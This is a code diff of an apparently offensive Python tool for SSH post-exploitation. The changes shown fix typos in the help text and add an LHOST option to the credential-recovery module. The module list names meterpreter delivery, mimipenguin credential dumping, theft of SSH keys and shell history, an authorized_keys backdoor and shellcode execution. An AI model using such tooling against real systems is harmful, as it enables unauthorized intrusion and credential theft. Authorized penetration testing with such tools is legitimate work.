@@ -316,7 +316,7 @@ def add_key_backdoor(targets, port, username, password, identity_file):
 
 
 def parse_targets(target):
-    #Stolen from CrackMapExec
+    # Stolen from CrackMapExec
     if '-' in target:
         ip_range = target.split('-')
         try:
@@ -442,23 +442,23 @@ def print_modules():
     print ""
     print CRED + "Available Modules:" + CEND
     print CYELLOW + "[*] meterpreter" + CEND + "               Use this to execute a meterpreter agent on the target(s)."
-    print    "                                  REQURED ARGUMENTS: LHOST , LPORT"
+    print    "                                  REQUIRED ARGUMENTS: LHOST, LPORT"
     print "                                 OPTIONAL ARGUMENTS: TYPE {python, php, 32, 64, osx}"
     print CYELLOW + "[*] mimipenguin" + CEND + "               Use this to execute a mimipenguin on the target(s) to recover credentials.  (Requires root)"
-    print "                                 OPTIONAL ARGUMENTS: LISTEN"
+    print "                                 OPTIONAL ARGUMENTS: LISTEN, LHOST"
     print CYELLOW + "[*] keys" + CEND + "                      Use this to collect SSH private keys from the target(s)."
     print CYELLOW + "[*] history" + CEND + "                   Use this to collect shell history files from the target(s)."
     print CYELLOW +  "[*] privs" + CEND + "                     Use this to enumerate sudo privileges on the targets(s)."
     print CYELLOW +  "[*] backdoor" + CEND + "                  Creates an RSA key pair and adds public key to authorized_keys file on targets(s)."
     print CYELLOW + "[*] web_delivery" + CEND + "              Use this to execute a python script on the target(s)."
-    print    "                                  REQURED ARGUMENTS: PATH"
+    print    "                                  REQUIRED ARGUMENTS: PATH"
     print "                                 OPTIONAL ARGUMENTS: LISTEN"
     print CYELLOW + "[*] custom_bin" + CEND + "                Use this to execute a custom binary on the target(s)."
-    print    "                                  REQURED ARGUMENTS: PATH"
+    print    "                                  REQUIRED ARGUMENTS: PATH"
     print CYELLOW + "[*] sudo_exec" + CEND + "                 Use this to execute a custom binary (with sudo) on the target(s)."
-    print    "                                  REQURED ARGUMENTS: PATH"
+    print    "                                  REQUIRED ARGUMENTS: PATH"
     print CYELLOW + "[*] shellcode" + CEND + "                 Use this to execute custom shellcode on the target(s)."
-    print    "                                  REQURED ARGUMENTS: PATH"
+    print    "                                  REQUIRED ARGUMENTS: PATH"
 
 
 def banner():
@@ -509,13 +509,18 @@ def main():
         else:
             try:
                 lport = options['LISTEN']
+                if 'LHOST' not in options:
+                    print "Getting machine's IP address..."
+                    lhost = get_ip()
+                else:
+                    lhost = options['LHOST']
             except KeyError:
                 print "Change the listening web server port with the LISTEN option"
+                print "Change the listening web server IP with the LHOST option"
                 exit()
-        mimipenguin(get_ip(), lport, targets, 22, args.username, args.password, args.identity_file)
+        mimipenguin(lhost, lport, targets, 22, args.username, args.password, args.identity_file)
 
     if args.module == "web_delivery":
-        lport = 8080
         if not args.options:
             print "The module requires options, You must supply the path of the custom script"
             exit()
@@ -633,6 +638,7 @@ def main():
             with open('output/' + filename, 'w') as file:
                 file.write(payload)
             start_thread(targets, "copy_exec", [22, args.username, args.password, args.identity_file, 'output/' + filename, 2])
+
 
 if __name__ == "__main__":
 
